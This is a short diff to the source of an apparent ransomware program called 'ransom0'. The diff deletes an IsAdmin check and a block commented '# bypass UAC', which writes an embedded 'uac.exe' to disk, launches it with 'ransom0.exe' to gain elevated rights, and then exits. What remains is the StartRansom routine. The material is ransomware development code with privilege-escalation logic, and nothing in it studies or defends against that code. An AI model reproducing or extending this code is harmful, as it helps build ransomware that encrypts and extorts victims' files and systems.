@@ -106,30 +106,9 @@ def SendData(decrypted):
 
 ransom0 = ransom0()
 
-def IsAdmin(self):
-        try:
-            is_admin = os.getuid() == 0
-        except AttributeError:
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        return is_admin
 
 
 def StartRansom():
-    
-    # bypass UAC
-    if platform.system() != "Windows":
-        pass
-    else:
-        if IsAdmin() != True:
-            file = open("uac.exe", "wb")
-            file.write(uac)
-            file.close()
-
-            subprocess.Popen("uac.exe ransom0.exe")
-            sys.exit(0)
-        else:
-            pass
-
 
 
     try:
